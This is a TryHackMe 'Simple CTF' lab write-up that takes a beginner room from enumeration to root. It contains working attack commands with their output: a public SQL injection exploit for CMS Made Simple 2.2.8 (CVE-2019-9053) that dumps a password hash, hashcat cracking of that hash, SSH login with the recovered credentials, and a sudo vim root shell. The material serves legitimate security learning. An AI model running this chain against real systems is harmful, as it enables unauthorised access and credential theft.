# Simple CTF
**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** General
**Completed:** March 2026
**Author:** Jay Patel

## Room Summary

A beginner-level room that chains FTP anonymous access, web enumeration,
CMS version fingerprinting, SQL injection exploitation, password hash cracking,
and sudo abuse into a complete attack path from zero credentials to root.
Nothing is given upfront: every piece of information is discovered through
enumeration.

The room reinforces the core pentest loop: enumerate every service, match
software versions to CVEs, exploit to gain access, escalate privileges.
CMS Made Simple below version 2.2.10 has an unauthenticated SQL injection
vulnerability in its News module that dumps database credentials without
requiring a logged-in session.

---

## Attack Chain Overview

```
Nmap → FTP anonymous login → ForMitch.txt → username: mitch
Gobuster → /simple/ → CMS Made Simple 2.2.8
CVE-2019-9053 SQLi → hash + salt extracted
hashcat -m 20 → password: secret
SSH port 2222 → user flag → sudo -l → vim → root flag
```

---

## Step 1: Initial Nmap Scan

**Goal:** Discover all open services across all ports before deciding where
to attack. Never scan default ports only: non-standard ports like 2222 are
deliberately used to avoid basic scanners.

```bash
nmap -sV -sC -p- --min-rate 5000 10.49.167.200
```

**Flag breakdown:**

| Flag | Purpose |
|---|---|
| `-sV` | Version detection: exact software and version on each port |
| `-sC` | Default NSE scripts: banner grabbing, anonymous FTP check, etc |
| `-p-` | Scan all 65535 ports: not just the default top 1000 |
| `--min-rate 5000` | Minimum packet rate: speeds up the full port scan |

**Output:**
```
kali@kali:~$ nmap -sV -sC -p- --min-rate 5000 10.49.167.200

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu0.8
```

**What each service tells you:**

| Port | Service | Key Detail | Next Action |
|---|---|---|---|
| 21 | FTP vsftpd 3.0.3 | Anonymous login allowed | Log in immediately and list all files |
| 80 | HTTP Apache 2.4.18 | Default page showing | Run gobuster for hidden directories |
| 2222 | SSH OpenSSH 7.2p2 | Non-standard port | Login target once credentials are found |

Two services run below port 1000: FTP on 21 and HTTP on 80.
SSH is running on port 2222: a non-standard port designed to avoid
basic scanners that only check common ports.

---

## Step 2: FTP Anonymous Login

**Goal:** vsftpd reported anonymous login allowed in the Nmap output.
Log in and retrieve any files.

```bash
kali@kali:~$ ftp 10.49.167.200
Connected to 10.49.167.200.
220 (vsFTPd 3.0.3)
Name (10.49.167.200:kali): anonymous
Password:
230 Login successful.
```

```bash
ftp> ls
ftp> ls pub/
```

**Output:**
```
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub

ftp> cd pub
ftp> ls
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt

ftp> get ForMitch.txt
ftp> bye
```

**Read the file:**
```bash
kali@kali:~$ cat ForMitch.txt

Dammit man... you're the worst dev I've seen. You set the same
password everywhere, genius. Do something more secure.
- management
```

**What this gives you:**
The filename `ForMitch.txt` directly reveals a username: `mitch`. The
content confirms this person reuses passwords across services. This is a
classic OSINT find: the developer's name leaking through a carelessly
named file in a publicly accessible FTP directory.

---

## Step 3: Web Enumeration

**Goal:** Discover hidden directories on the web server and identify
what application is running.

```bash
kali@kali:~$ curl http://10.49.167.200/robots.txt
```

**Output:**
```
#
# "$Id: robots.txt 3681 2003-11-08 17:18:50Z mike $"
#
#  This file tells search engines not to index your site.
#
User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3
#
# End of "$Id: robots.txt 3681 2003-11-08 17:18:50Z mike $"
```

`/openemr-5_0_1_3` looks interesting but returns a 404: it is a red herring.
Always verify paths exist before chasing them. Gobuster will find what is
actually there.

```bash
kali@kali:~$ gobuster dir \
-u http://10.49.167.200 \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt
```

**Output:**
```
===============================================================
Gobuster v3.1.0
===============================================================
/index.html           (Status: 200)
/robots.txt           (Status: 200)
/simple               (Status: 301)
===============================================================
```

Navigate to `http://10.49.167.200/simple/`: this loads **CMS Made Simple**.
Scroll to the bottom of the page to find the version in the footer:
**CMS Made Simple Version 2.2.8**

---

## Step 4: CVE-2019-9053 SQL Injection + Hash Extraction

**Goal:** CMS Made Simple 2.2.8 is vulnerable to an unauthenticated SQL
injection in the News module. Use this to extract the username, password
hash, and salt directly from the database.

```bash
kali@kali:~$ searchsploit cms made simple 2.2
```

**Output:**
```
CMS Made Simple < 2.2.10 - SQL Injection   | php/webapps/46635.py
```

**Download the exploit:**
```bash
kali@kali:~$ searchsploit -m php/webapps/46635.py
```

**Run the exploit to extract credentials:**
```bash
kali@kali:~$ python2 46635.py \
-u http://10.49.167.200/simple/
```

**Output:**
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password hash found: 0c01f4468bd75d7a84c7eb73846e8d96
```

**What happened here:**
The exploit sends a crafted request to the News module that causes the
database to return user records without any login. It extracts the username,
email, password hash, and the salt used to hash the password. The hash alone
cannot be cracked without the salt: both are needed together.

---

## Step 5: Crack the Hash with Hashcat

**Goal:** The extracted hash is salted MD5. Identify the hash type and crack
it using hashcat with rockyou.txt.

**Save the hash in hashcat format (hash:salt):**
```bash
kali@kali:~$ echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt
```

**Identify the hash type:**
```bash
kali@kali:~$ hashid hash.txt
```

**Output:**
```
--File 'hash.txt'--
Analyzing '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2'
[+] MD5
[+] MD4
[+] Double MD5
```

The hash format `hash:salt` with MD5 maps to **hashcat mode -m 20**
which is `md5($salt.$pass)`: the salt is prepended to the password
before hashing.

**Run hashcat:**
```bash
kali@kali:~$ hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

**Flag breakdown:**

| Flag | Purpose |
|---|---|
| `-a 0` | Attack mode 0 = straight dictionary attack |
| `-m 20` | Hash type 20 = md5($salt.$pass): salted MD5 |
| `hash.txt` | File containing hash:salt |
| `rockyou.txt` | Wordlist to crack against |

**Output:**
```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2
Time.Started.....: 0 secs
Guesses.Mask.....: rockyou.txt
```

**Credentials recovered:** `mitch:secret`

---

## Step 6: SSH Login on Port 2222

**Goal:** Use the recovered credentials to get a shell on the target.
SSH is on non-standard port 2222: remember to specify it.

```bash
kali@kali:~$ ssh -p 2222 mitch@10.49.167.200
```

**Output:**
```
mitch@10.49.167.200's password: secret

Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

$ ls
user.txt

$ cat user.txt
G00d j0b, keep up!
```

**Login method:** SSH with password credentials.
**User flag:** `G00d j0b, keep up!`

---

## Step 7: Enumerate for Privilege Escalation

**Goal:** Find other users on the system and check what the current user
can run with elevated privileges.

```bash
$ ls /home/
```

**Output:**
```
mitch  sun
```

Another user `sun` exists on the system.

```bash
$ sudo -l
```

**Output:**
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`sudo -l` is always the first privilege escalation check on any system.
This output shows that `mitch` can run `vim` as root with no password
required. Any binary in a `sudo -l` output with `NOPASSWD` is an instant
privilege escalation path: check GTFOBins for the exact method.

---

## Step 8: Privilege Escalation via vim

**Goal:** Abuse the sudo vim permission to spawn a root shell.
GTFOBins documents this exact technique.

```bash
$ sudo vim -c ':!/bin/bash'
```

Alternatively inside vim:
```bash
$ sudo vim
# Then type inside vim:
:shell
```

**Output:**
```
root@Machine:~# id
uid=0(root) gid=0(root) groups=0(root)

root@Machine:~# cat /root/root.txt
W3ll d0n3. You made it!
```

`vim -c ':!/bin/bash'` passes a command to vim on startup using the `-c`
flag which executes any vim command before loading. `:!` runs a shell
command from inside vim. Since vim was launched as root via sudo, the
shell spawned inherits root privileges.

---

## What I Learned / What Surprised Me

The file naming convention was what I found most interesting here.
`ForMitch.txt` is a completely accidental but critical OSINT leak: the
developer's name sitting in a publicly accessible FTP directory gave me
a confirmed username before touching anything else. In real environments
this kind of careless naming happens constantly.

The robots.txt red herring was a useful lesson. `/openemr-5_0_1_3`
looked significant but returned a 404. Gobuster found the actual path
`/simple/` which robots.txt never mentioned. Never trust robots.txt as
your only source of directory discovery: always run a full brute force.

The salted MD5 hash cracking with hashcat mode `-m 20` was the most
technically instructive step. The hash and salt must be combined in
`hash:salt` format and the correct hashcat mode must match how the
application stored the password. Getting that wrong means hashcat runs
forever and cracks nothing.

The `sudo -l` output giving `vim` with `NOPASSWD` is a reminder that
privilege escalation does not always require an exploit. GTFOBins
should be open in a tab the moment you get a shell on any system.

---

## Full Attack Chain Reference

```
1.  nmap -sV -sC -p- --min-rate 5000 10.49.167.200
    → FTP(21), HTTP(80), SSH(2222)

2.  ftp 10.49.167.200
    → Anonymous login → ForMitch.txt → username: mitch

3.  gobuster dir -u http://10.49.167.200 -w common.txt
    → /simple/ → CMS Made Simple 2.2.8

4.  searchsploit cms made simple 2.2
    → CVE-2019-9053 → 46635.py

5.  python2 46635.py -u http://10.49.167.200/simple/
    → hash: 0c01f4468bd75d7a84c7eb73846e8d96
    → salt: 1dac0d92e9fa6bb2

6.  echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt
    hashcat -a 0 -m 20 hash.txt /usr/share/wordlists/rockyou.txt
    → mitch:secret

7.  ssh -p 2222 mitch@10.49.167.200
    → user.txt: G00d j0b, keep up!

8.  sudo -l
    → (root) NOPASSWD: /usr/bin/vim

9.  sudo vim -c ':!/bin/bash'
    → root shell → root.txt: W3ll d0n3. You made it!
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sV -sC -p- --min-rate 5000 <IP>` | Full port scan with version detection |
| `ftp <IP>` then username `anonymous` | Anonymous FTP login |
| `ftp> ls -al` | List all files including hidden |
| `ftp> get <file>` | Download file from FTP |
| `gobuster dir -u <URL> -w <wordlist>` | Directory brute force |
| `searchsploit cms made simple 2.2` | Find exploit for CMS version |
| `searchsploit -m <path>` | Download exploit to current directory |
| `python2 46635.py -u <URL>` | Run SQLi exploit to extract hash and salt |
| `echo "hash:salt" > hash.txt` | Save hash in hashcat format |
| `hashid hash.txt` | Identify hash type |
| `hashcat -a 0 -m 20 hash.txt rockyou.txt` | Crack salted MD5 hash |
| `ssh -p 2222 user@<IP>` | SSH on non-standard port |
| `sudo -l` | Check sudo permissions: always first privesc step |
| `sudo vim -c ':!/bin/bash'` | Escalate via vim GTFOBins technique |
